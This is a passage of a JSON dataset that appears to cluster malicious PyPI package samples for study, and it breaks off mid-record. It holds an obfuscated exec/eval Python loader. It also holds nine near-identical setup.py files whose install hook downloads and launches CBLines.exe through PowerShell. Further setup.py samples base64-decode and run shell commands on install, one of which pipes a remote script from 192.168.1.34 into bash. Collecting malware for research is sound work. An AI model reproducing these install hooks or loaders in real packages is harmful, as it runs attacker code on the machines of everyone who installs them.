        "code": "import random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(binascii)'],['''e0U!Gnj*g@44ti(*pd8Bw1d~iPqF|99-{xAC}47(hkpMaRc7S>3(8e71Q0>NiA0(+mJ5Kp8UsGY-P&95O62nNc;C%k1ObAx1^2mrnyMU2poUSURR1=OGXtJm<D~q&&Q|6@;eT6gM2%ISb|-f)IZKEd?P2tOFC&SGmZIIYZ%yZ!=-ymud#hG6@X%nlRT{DW(v!NhE3F3SC^JW)Hrmfc_kki$EMMuXfhL$yOc)<rJ{kUtN|J}?qnYuOVyUzY3}=n-*j_hl%!EWOm{zT-+;=vK(5_n6C4N9YfO#CU*N18E=^)#-%C|W(CS5Kj<Ez@~qC^-?kXSFyoE#sqDhdWe2$F=Gt~T~W<oueC^VpWYV!+e+kxfwX$9}N?Y~ip>hz$844DE?Y1i&petw6%7feb2Cx=JG`ENC>y|F&q&@w7k>!pDa<JDN1Hag<^a{VGv}m<hg7gBcfBZ70SpP-4S7gy=MbPjVc%S!u_JPTd)tFn)~2j2d;AGaS5*Wv{CEtZh}sL&E%f9n^q(K1{7P$M?_8=3lJdbm~i!r);|qCPMZy)r_?j3Gt4S2@JVaW5TnDIKRexIYr=!Wjrk}jv4gBbZsUZd;MKFGh=w5IA2(Mf~VAruShNnwPQ16U4d5%jr9FTdaBaeakinTNeum@o^JL*mW_bFI;lmRoM2S=63crb+a=GyjuJo9?CxrzODK`S7-5P6OdGrGzwm<ZMq1jcQw^ISwo4zf_<mxj6@@24-&;CouNBu|XgT@?JKSyFoK!AXb`tb4SLRy%Kqdk|tD$A)5d^#lpNA3*d*nUD6XdJQTGyeh*4I#H45nsvK__Zu#us{fnDLVhYA`b15iNW%=ICM}KIt8drW{LK3O3gwYCKyMLFNY+DlFM~CgBs*KCzxO2yLiUWr(&|=^^iZm&CkfL-u<4ST74FN!L--5*8domLVC0wa>0#ujZuMq<a*5P`N)Yj!rC(^(vIv&5%X-(hypKq8O6+o*Hl!7I#=C2Lbr9=G}mUa$xC*e3w@l8)NE9+kh?WZGHyC$2ZpBH3X#>xeZTGCT#yBb{b)lye9uen6tTZjVC=*)r4U3mxU2r%Jc4IW=W)C`JV^Yz!9ScK9LB*yv+rVfLcKvYota<8R|=?f{0k9<1Gre)|{b$&7nUxh(%l8ddw^exPE(bk`kg2oO^$f(8U92>{px&q+r2E@g+r6SN1c@iBvNoP~@>5ug9<j*reenL9I+bDE<8J+@n+-(@1wcN=ExPUP*e1HuRT`G{sVr^3oNvw)pE^65ddtUy2QI&b4TK5W=gz7;~L|sWljAfkn2VW(>B()f;S+RJ)ujmV#SINHvsP?B(S9!_T{?Ru#AzuA#QhZYiAF#|b<1?<mhWJUaJuTLZ9u+}kg`R~1}YUMF}hhb47=OL1EdL(Xg6!Xs;}lc3;R3-2)|9bHmzzeDmz7AnXYvcU6NkWS(#fXK7%L3EnbK(gTh!ZZr*>evDRbUyY@3UlN7!f(}ho9GrrZRVDF7)(DMRu#_6lt`uf%iKlH+OAEKCs1&vUc{%x>Z?I-9(q{)#l;^FitzrBSUmDYp3X+?LM@wsq*2PXh;pw)USq3>tNem2;uc7eH5<hT<Z%q=7Nm!u(V$c=R9xhL{&<5wf97kY`+2Dr+JG+tD?AYKa=U-2E-c1S!`a{96!g!OEy9%?xLJ{ktB&I<elSN#0P7h=(=-+o2SaJabA`U*pK-xUqr=#HVZGC6E3v0k17*CI+J;c=y&4<+Uj'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')"
      }
    ]
  },
  {
    "cluster_id": 38,
    "size": 9,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-14-pyaacv-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pyaacv',\n    version='0.1',\n    description='PythonBased',\n    packages=['pyaacv'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-larpexodus-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='larpexodus',\n    version='0.1',\n    description='cantdoitanymorehaahahaaha',\n    packages=['larpexodus'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-12-nezur-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='nezur',\n    version='0.1',\n    description='A sleek Hash/Encryption management process',\n    packages=['nezur'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-12-solaraund-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='solaraund',\n    version='0.1',\n    description='cantdoitanymorehaahahaaha',\n    packages=['solaraund'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-13-pymatcha-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pymatcha',\n    version='0.1',\n    description='PythonBased',\n    packages=['pymatcha'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-14-partpyth-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='partpyth',\n    version='0.1',\n    description='PythonBased',\n    packages=['partpyth'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-15-pycordapi-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pycordapi',\n    version='0.1',\n    description='Python-based installation package. DLL/API Support',\n    packages=['pycordapi'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-15-pydeobf-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pydeobf',\n    version='0.1',\n    description='Python-based installation package. DLL/API Support',\n    packages=['pydeobf'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-15-pydllcfg-v0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\nimport os\n\nclass CustomInstallCommand(install):\n    \"\"\"Custom installation script.\"\"\"\n    def run(self):\n        output_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n        \n        # Step 1: Download the file using PowerShell's Invoke-WebRequest\n        download_command = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\\\"\"\n        download_result = subprocess.run(download_command, shell=True, text=True)\n\n        if download_result.returncode == 0 and os.path.exists(output_file):\n            print(\"Download successful. Now opening the file...\")\n\n            # Step 2: Use Start-Process to open the downloaded MP3 file\n            open_command = f\"powershell -Command \\\"Start-Process '{output_file}'\\\"\"\n            open_result = subprocess.run(open_command, shell=True, text=True)\n\n            print(\"Open Output:\", open_result.stdout)\n            print(\"Open Error:\", open_result.stderr)\n        else:\n            print(\"File download failed or file not found.\")\n\n        # Call the standard install\n        install.run(self)\n\nsetup(\n    name='pydllcfg',\n    version='0.1',\n    description='PythonBased',\n    packages=['pydllcfg'],\n    install_requires=[\n        # Dependencies\n    ],\n    cmdclass={\n        'install': CustomInstallCommand,  # Override the install command\n    },\n)\n\nprint(\"hello\")\n\nprint(\"hello\")\n"
      }
    ]
  },
  {
    "cluster_id": 39,
    "size": 23,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-31-pohekar-everyday-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"CODE_REPLACE\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"pohekar-everyday\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-01-haisenbergs-pkg-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"bWtkaXIgQzpcV2luZG93c1xVc2Vyc1xyb290XERlc2t0b3BcSEFDS19ZT1VfRElSCg==\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"haisenbergs-pkg\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tiny423-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"Y3VybCAgLXMgaHR0cDovLzE5Mi4xNjguMS4zNDo4MDAwL3Rlc3QudHh0IHwgYmFzaAo=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tiny423\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tiny43-v1.0.0",
        "code": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nimport base64\nimport os\n\ndef b64d(base64_code):\n    base64_bytes = base64_code.encode('ascii')\n    code_bytes = base64.b64decode(base64_bytes)\n    code = code_bytes.decode('ascii')\n    return code\n\ndef notmalfunc():\n    os.system(b64d(\"ZWNobyBob2xhIHF1ZSB0YWwgPiB0cnVlLnhtbAo=\"))\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"tiny43\",\n    version = \"1.0.0\",\n    author = \"TGH\",\n    author_email = \"tgh@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/thegoodhackertv/malpip\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/thegoodhackertv/malpip/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages 